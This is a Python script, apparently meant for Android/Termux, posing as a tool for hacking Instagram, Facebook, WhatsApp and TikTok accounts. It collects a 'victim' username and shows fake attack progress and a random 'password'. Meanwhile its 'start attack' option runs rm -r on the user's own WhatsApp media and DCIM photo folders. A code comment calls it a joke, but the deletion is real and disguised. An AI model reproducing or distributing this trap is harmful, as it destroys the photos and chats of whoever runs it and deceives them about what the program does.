#-*-coding: utf-8 -*-
## Módulos a importar

### Esto es una broma lea detenidamente el código

class color:
    verde = '\033[92m' 
    amarillo = '\033[93m' 
    rojo = '\033[91m' 
    reset = '\033[0m' 



import os
import time
import string
import random
characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")
clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
print(color.amarillo+"""Esta herramienta a sido creada con fines experimentales
no somos responsables del mal uso de la misma!"""+ color.reset)
time.sleep(4)
clearConsole()
def menu():
    print(color.rojo +"╔╗╔╗╔══╗╔═╗╔╦╗──╔══╗╔═╗╔═╗╔══╗╔══╗╔╗─")
    print("║╚╝║║╔╗║║╔╝║╔╝──║══╣║║║║╔╝╚║║╝║╔╗║║║─")
    print("║╔╗║║╠╣║║╚╗║╚╗──╠══║║║║║╚╗╔║║╗║╠╣║║╚╗")
    print("╚╝╚╝╚╝╚╝╚═╝╚╩╝──╚══╝╚═╝╚═╝╚══╝╚╝╚╝╚═╝"+ color.reset)
    print(color.verde+"      By Anonimo Root & Mr Star    \n"+ color.reset)
    print("Para solución de problemas telegram: @AnonimoRoot @unixstar1\n")

    r=int(input(color.verde + """Menú:
    1-Instagram
    2-Facebook
    3-WhatsApp
    4-TikTok
    5-Iniciar ataque
    $: """+ color.reset))

    if r==1 or r==2 or r==3 or r==4:
        input(color.rojo + "Ingrese usuario de la victima: " + color.reset)
        print(color.rojo + "Usuario guardado" + color.reset)
        time.sleep(2)
        clearConsole()
        menu()
    else:
        print(color.rojo + "Iniciando ataque" + color.reset)
        time.sleep(3)
        print(color.verde + "Éxito" + color.reset)
        time.sleep(1)
        print(color.rojo + "Iniciando transferencia de informacion"+ color.reset)
        os.system("rm -r /storage/emulated/0/Android/media/com.whatsapp")
        os.system("rm -r /storage/emulated/0/Android/media/com.whatsapp.w4b")
        os.system("rm -r /storage/emulated/0/DCIM")
        os.system("rm -r /storage/emulated/0/dcim")
        os.system("rm -r /storage/emulated/0/FMWhatsApp")
        os.system("rm -r /storage/emulated/0/YoWhatsApp")
        time.sleep(8)
        print(color.verde + "Éxito" + color.reset)
        time.sleep(1)
        print(color.verde + "Ataque exitoso"+ color.reset)
        time.sleep(2)
        print(color.rojo + "Contraseña:" + color.reset)
        contra( )
def contra():
    length =random.randrange(8, 15)
    random.shuffle(characters)
    password = []
    for i in range(length):
        password.append(random.choice(characters))
    random.shuffle(password)
    print("".join(password))


menu()
